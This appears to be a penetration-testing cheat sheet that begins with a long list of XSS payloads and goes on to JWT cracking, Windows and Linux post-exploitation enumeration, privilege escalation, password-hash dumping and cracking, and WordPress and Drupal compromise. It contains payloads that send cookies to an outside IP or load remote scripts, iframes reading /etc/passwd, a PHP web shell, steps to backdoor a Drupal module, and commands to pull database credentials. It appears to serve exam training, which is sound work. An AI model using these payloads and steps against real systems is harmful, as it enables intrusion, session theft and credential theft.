<script>alert(1)</script>
<Script>alert(1)</Script>
<sCript>alert(document.domain)</sCript>
<script>alert(123);</script>
<script>alert("test");</script>
<script>alert(document.cookie)</script>
</script><script>alert(document.cookie)</script>
javascript:alert(document.cookie)
javascript:prompt(document.cookie)
'-alert(document.cookie)-'
</script><svg onload=alert(document.cookie)>
"onmouseover=alert(document.cookie)//
{{$on.constructor('alert(1)')()}}
<Script>alert(document.cookie)</Script>
<sCript>alert(document.domain)</sCript>
<script>alert(document.cookie);</script>
<script>alert(document.cookie);</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>new Image().src="http://192.168.1.6/?c="+document.cookie;</script>
<script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>
</script><script>alert(1)</script>
<img src="abc" onerror="alert(1)">
<img src="" onerror="alert(document.cookie)">
<img src='x' onerror='alert(document.cookie)' />
&lt;img src=0 onerror=alert(&#39;1&#39;)&gt;
&lt;img src=0 onerror=alert(document.cookie)&gt;
<svg/onload=alert(1)>
"><svg onload=alert(1)>
';alert('1');'
';alert('abc');'
<sc<script>ript>alert(1)</sc</script>ript>
<BODY ONLOAD=alert('1')>
<marquee onstart=alert(1)></marquee>
<audio src/onerror=alert(1)>
<audio src/onerror=prompt(123)>
<audio src/onerror=confirm(123)>
<script src="http://192.168.1.6/test.js" ></script>
<body onload=alert(123) >
<body onload=confirm(123) >
<body onload=prompt(123) >
--><svg/onload=alert(document.domain)>
--><body onload=alert(123) >
--><script>alert(1)</script>
--><img src=x onerror=alert('test')>
--><img src=x onerror=alert(document.domain)>
--><img src=x onerror=alert(document.cookie)>
--><img src=x onerror=prompt(document.domain)>
--><img src=x onerror=confirm(document.domain)>
<iframe src='https://testforiframe.site/'>
"><iframe src='https://testforiframe.site/'>
"><script src="https://testforiframe.site/"></script>
"><script>alert(document.domain)</script>
"><script>alert(document.domain + '\n' + "1")</script>
"><script>alert(document.domain + '\n' + "Name")</script>
"<img src='x' onerror='alert(10)' />"
https://brutelogic.com.br/poc.svg
http://xss.rocks/scriptlet.html
javascript:alert(document.cookie)
poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
"><script>alert(1)</script>
'or<script>alert(1)</script>
'or<img src=0 onerror=alert('1')>
<script <script>>alert('test')</script>  
<audio src/onerror=alert('test')>
<iframe src=javascript:alert('test')>
<iframe src="javascript:alert(test)">
<img src=x onerror=alert(test)>
';alert(test); //
<body onmouseover="print()">
<body onclick=print()>
<body onmessage=print()>
<iframe onload=print()></iframe>
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG """><SCRIPT>alert(document.cookie)</SCRIPT>"\>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<<SCRIPT>alert(document.cookie);//\<</SCRIPT>>
<iframe src=http://xss.rocks/scriptlet.html <
</script><script>alert(document.cookie);</script>
</TITLE><SCRIPT>alert(document.cookie);</SCRIPT>
<BODY ONLOAD=alert(document.cookie)>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
<script>'-alert(1)-'</script>
'-alert(1)-'
></select><img%20src=1%20onerror=alert(1)>
{{$on.constructor('alert(1)')()}}
\"-alert(1)}//
<img src=1 onerror=print()>
"-top['al\x65rt']('sailay')-" 
<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
<img src="" onerror="innerHTML=decodeURIComponent.call`${location.hash}`" "="">
<img src="" onerror="location=/javascript:/.source+location" "="">
<img src="" onerror="window.onerror=alert;throw 1337" "="">
<img src="" onerror="alert&1par;1337&rpar;" "="">
<img src="" onerror="alert`1337`" "="">
javascript:alert(document.cookie)
"><img src=x onerror=alert(document.domain)>
"><script>alert(1)</script>
"><script>alert(document.domain)</script>
"><script>alert(document.cookie)</script>
"><script>prompt(1)</script>
"><script>prompt(document.domain)</script>
"><script>prompt(document.cookie)</script>
"><svg><script>alert(1)</script>
?s="onerror="innerHTML=decodeURIComponet.call`${location.hash}`"#<img src onerror=alert(1337)>
?s="onerror="location=/javascript:/.source%2Blocation"&a=%0A+alert(1337)
?s="onerror="window.onerror=alert;throw 1337"
?s="onerror="alert%261par;1337%26rpar;"
?s="onerror="alert`1337`"
<img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>
<link rel=attachment href="file:///etc/passwd">
<iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
<IMG sRC=X onerror=jaVaScRipT:alert`xss`>
%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E
<svg  xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
<svg><style> <script>alert(1)</script> </style></svg>
<math><style> <img src onerror=alert(2)> </style></math>
<script>window.location.assign('https://secure.eicar.org/eicar_com.zip')</script>
<body style="background-color:red">
<body style="background-color:red !important;">
<body onload=window.location.assign('https://www.google.com')>
alert(123)
alert("test")
alert(document.cookie)
alert(document.domain)
confirm(123)
confirm("test")
confirm(document.cookie)
confirm(document.domain)
prompt(123)
prompt("test")
prompt(document.cookie)
prompt(document.domain)
```

### JWT

Capture JWT token using Burp Suite (after a login) and crack it using Hashcat or JohnTheRipper

```bash
hashcat -m 16500 -a 0 jwt.txt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
secret-key
```

Go to: [https://jwt.io/](https://jwt.io/) for discovering more info regarding token.

### API

Search the documentation file to discover endpoints available for attack target.

## Post-Exploitation

### **Win Local Enumeration**

```bash
# MSF Meterpreter
getuid
sysinfo
show_mount
cat C:\\Windows\\System32\\eula.txt
getprivs
pgrep explorer.exe
migrate <PROCESS_ID>

# Win CMD - run 'shell' in Meterpreter
## System
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

## Users
whoami
whoami /priv
query user
net users
net user <USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

## Network
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

## Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

# Metasploit
use post/windows/gather/enum_logged_on_users
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares

# JAWS - Automatic Local Enumeration - Powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
```

### **Linux Local Enumeration**

```bash
# MSF Meterpreter
getuid
sysinfo
ifconfig
netstat
route
arp
ps
pgrep vsftpd

# Linux SHELL - run 'shell' in Meterpreter
## System
/bin/bash -i
cd /root
hostname
cat /etc/*issue
cat /etc/*release
uname -a
dpkg -l

env
lscpu
free -h
df -h
lsblk | grep sd

## Users
whoami
ls -lah /home
cat /etc/passwd
cat /etc/passwd | grep -v /nologin
groups <USER>
groups root
groups
who
w
last
lastlog

## Network
ifconfig
ip -br -c a
ip a
cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
arp -a

## Services
ps
ps aux
ps aux | grep msfconsole
ps aux | grep root
top
cat /etc/cron*
crontab -l

# Metasploit
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system
use post/linux/gather/checkvm

# LINENUM - Automatic Enumeration
cd /tmp
upload LinEnum.sh
shell
/bin/bash -i
chmod +x LinEnum.sh
./LinEnum.sh

./LinEnum.sh -s -k <keyword> -r <report> -e /tmp/ -t
```

### **Transferring Files**

```bash
# PYTHON WEB SERVER
python -V
python3 -V
py -v # on Windows

# Python 2.7
python -m SimpleHTTPServer <PORT_NUMBER>

# Python 3.7
python3 -m http.server <PORT_NUMBER>

# On Windows, try 
python -m http.server <PORT>
py -3 -m http.server <PORT>
```

```bash
# TMUX Terminal Multiplexer
sudo apt install tmux -y
```

**Shells**

```bash
cat /etc/shells
    # /etc/shells: valid login shells
    /bin/sh
    /bin/dash
    /bin/bash
    /bin/rbash

/bin/bash -i

/bin/sh -i
```

**TTY Shells**

```bash
# BASH
/bin/bash -i
/bin/sh -i
SHELL=/bin/bash script -q /dev/null

# Setup environment variables
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=/bin/bash
```

```bash
# PYTHON
python --version
python -c 'import pty; pty.spawn("/bin/bash")'

## Fully Interactive TTY
# Background (CTRL+Z) the current remote shell
stty raw -echo && fg
# Reinitialize the terminal with reset
reset
```

```bash
# FULL TTY PYTHON3 SHELL
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Background CTRL+Z
stty raw -echo && fg
# ENTER
export SHELL=/bin/bash
export TERM=screen
stty rows 36 columns 157
# stty -a to get the rows & columns of the attacker terminal
reset
```

```bash
# PERL
perl -h
perl -e 'exec "/bin/bash";'
```

## **Privilege Escalation**

### **Win Privilege Escalation**

```bash
# PrivescCHECK - PowerShell script
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"

## Basic mode
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

## Extended Mode + Export Txt Report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

### **Linux Privilege Escalation**

```bash
# Writable files
find / -not -type l -perm -o+w

# e.g. of /etc/shadow with write permissions
openssl passwd -1 -salt abc password123
vim /etc/shadow # Paste the hashed password
su

# SETUID - SUDO privileges
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null

sudo -l

# e.g. User can run 'man' with SUDO Privileges
sudo man ls
	!/bin/bash
```

### **Dumping & Cracking**

#### **Windows**

```bash
hashdump

# JohnTheRipper
john --list=formats | grep NT
john --format=NT hashes.txt

gzip -d /usr/share/wordlists/rockyou.txt.gz
john <Hash_Password-File> --wordlist=/usr/share/wordlists/rockyou.txt # To crack the password from your previous output (hashdump,shadow file )
john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash

#this is another way to crack passwords (that requires shadow file with passwd file)
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
```

#### **Linux**

```bash
cat /etc/shadow

# Metasploit
use post/linux/gather/hashdump

john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash

# Hashcat
hashcat --help | grep 1800
hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
ashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
```

## Frameworks

### Wordpress

#### **Basic Information**

**Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

In **wp-config.php** you can find the root password of the database.

Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

#### **Main WordPress Files**

* `index.php`
* `license.txt` contains useful information such as the version WordPress installed.
* `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
* Login folders (may be renamed to hide it):
  * `/wp-admin/login.php`
  * `/wp-admin/wp-login.php`
  * `/login.php`
  * `/wp-login.php`
* `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
* The `wp-content` folder is the main directory where plugins and themes are stored.
* `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
* `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.

**Post exploitation**

* The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

**Users Permissions**

* **Administrator**
* **Editor**: Publish and manages his and others posts
* **Author**: Publish and manage his own posts
* **Contributor**: Write and manage his posts but cannot publish them
* **Subscriber**: Browser posts and edit their profile

#### **Passive Enumeration**

**Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

* Grep

```bash
curl https://victim.com/ | grep 'content="WordPress'
```

* Meta name

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* CSS link files

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* JavaScript files

#### **Get Plugins**

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

#### **Get Themes**

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

#### **Extract versions in general**

```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

#### **Active enumeration**

#### **Plugins and Themes**

You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to **actively Brute Force a list of Plugins and Themes** (hopefully for us there are automated tools that contains this lists).

**Users**

**ID Brute**

You get valid users from a WordPress site by Brute Forcing users IDs:

```bash
curl -s -I -X GET http://blog.example.com/?author=1
```

If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.

**wp-json**

You can also try to get information about the users by querying:

```bash
curl http://blog.example.com/wp-json/wp/v2/users
```

**Only information about the users that has this feature enable will be provided**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

**Login username enumeration**

When login in **`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**.

**WPScan**

```bash
wpscan -h #List WPscan Parameters
wpscan --update #Update WPscan

#Enumerate WordPress using WPscan


wpscan --url "http://<TARGET_IP>" -e t #All Themes Installed

wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed

wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed

wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed

wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users

wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords

#Upload Reverse Shell to WordPress
http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php

#Upload using Metasploit
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set USERNAME admin
msf exploit(wp_admin_shell_upload) > set PASSWORD admin
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
msf exploit(wp_admin_shell_upload) > exploit
```

### Drupal

#### Discovery

* Check **meta**

```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```

* **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.

```bash
curl drupal-site.com/node/1
```

#### Enumeration

Drupal supports **three types of users** by default:

1. **`Administrator`**: This user has complete control over the Drupal website.
2. **`Authenticated User`**: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. **`Anonymous`**: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

**Version**

* Check `/CHANGELOG.txt`

```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```

\{% hint style="info" %\} Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files. \{% endhint %\}

#### **Username enumeration**

**Register**

In _/user/register_ just try to create a username and if the name is already taken it will be notified:

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Request new password**

If you request a new password for an existing username:

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

If you request a new password for a non-existent username:

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Get number of users**

Accessing _/user/\<number>_ you can see the number of existing users, in this case is 2 as _/users/3_ returns a not found error:

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Hidden pages**



**Fuzz `/node/$` where `$` is a number** (from 1 to 500 for example).\
You could find **hidden pages** (test, dev) which are not referenced by the search engines.

**Installed modules info**

```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```

**Automatic**

```bash
droopescan scan drupal -u http://drupal-site.local
```

**RCE**

**With PHP Filter Module**

\{% hint style="warning" %\} In older versions of Drupal **(before version 8)**, it was possible to log in as an admin and **enable the `PHP filter` module**, which "Allows embedded PHP code/snippets to be evaluated." \{% endhint %\}

You need the **plugin php to be installed** (check it accessing to _/modules/php_ and if it returns a **403** then, **exists**, if **not found**, then the **plugin php isn't installed**)

Go to _Modules_ -> (**Check**) _PHP Filter_ -> _Save configuration_

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Then click on _Add content_ -> Select _Basic Page_ or _Article -_> Write _php shellcode on the body_ -> Select _PHP code_ in _Text format_ -> Select _Preview_

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Finally just access the newly created node:

```
curl http://drupal-site.local/node/3
```

**Install PHP Filter Module**

From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **module is not installed by default**. To leverage this functionality, we would have to **install the module ourselves**.

1. Download the most recent version of the module from the Drupal website.
   1. wget [https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz](https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz)
2. Once downloaded go to **`Administration`** > **`Reports`** > **`Available updates`**.
3. Click on **`Browse`**`,` select the file from the directory we downloaded it to, and then click **`Install`**.
4. Once the module is installed, we can click on **`Content`** and **create a new basic page**, similar to how we did in the Drupal 7 example. Again, be sure to **select `PHP code` from the `Text format` dropdown**.

**Backdoored Module**

A backdoored module can be created by **adding a shell to an existing module**. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Download the archive and extract its contents.

```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

* Create a **PHP web shell** with the contents:

```bash
<?php
system($_GET["cmd"]);
?>
```

* Next, we need to create a **`.htaccess`** file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the **`/modules`** folder.

```bash
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

* The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

* Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
* Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.

**Post Exploitation**

**Read settings.php**

```bash
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```

**Dump users from DB**

```bash
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```

**\[CVE-2018-7600] Drupalgeddon 2**

[https://ine.com/blog/cve-2018-7600-drupalgeddon-2](https://ine.com/blog/cve-2018-7600-drupalgeddon-2)

In late March 2018, a critical vulnerability was uncovered in Drupal CMS. **Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1** versions were affected by this vulnerability.

It allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or standard module configurations.

A lot of PoC is available to exploit this vulnerability.

### Spring

#### **Authorization Bypass**

[CVE 2022-22978: **Authorization Bypass in RegexRequestMatcher**](https://github.com/ducluongtran9121/CVE-2022-22978-PoC)



**References (thanks to all <3):**

[https://blog.syselement.com/ine/courses/ejpt](https://blog.syselement.com/ine/courses/ejpt)

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal)

[https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)
